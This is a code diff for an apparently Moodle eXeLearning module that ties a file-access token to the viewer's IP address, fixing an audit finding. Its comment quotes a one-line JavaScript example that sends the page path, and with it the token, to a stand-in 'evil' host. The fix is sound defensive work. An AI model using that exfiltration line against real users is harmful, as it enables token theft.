@@ -250,11 +250,18 @@ if (!$mainfile) {
         // regenerated per request). It only authorises file reads and
         // exelearning_pluginfile() still enforces mod/exelearning:view, so the token
         // grants strictly less than the same-origin sesskey it replaces.
+        //
+        // The token rides in the URL path, so untrusted author JS in the opaque iframe can
+        // read it (a document can always read its own location) and the document CSP allows
+        // img/media/frame over https:, i.e. it CAN be exfiltrated to a third-party host (e.g.
+        // new Image().src='https://evil/?'+location.pathname). Bind the key to the viewer's IP
+        // so an exfiltrated token is useless when replayed from the attacker's server (the
+        // legitimate file fetches come from the same browser, hence the same IP). (audit M-2)
         $filetoken = get_user_key(
             'core_files',
             $USER->id,
             null,
-            null,
+            getremoteaddr(),
             (intdiv(time(), HOURSECS) + 2) * HOURSECS
         );
         $iframeurl = new moodle_url(
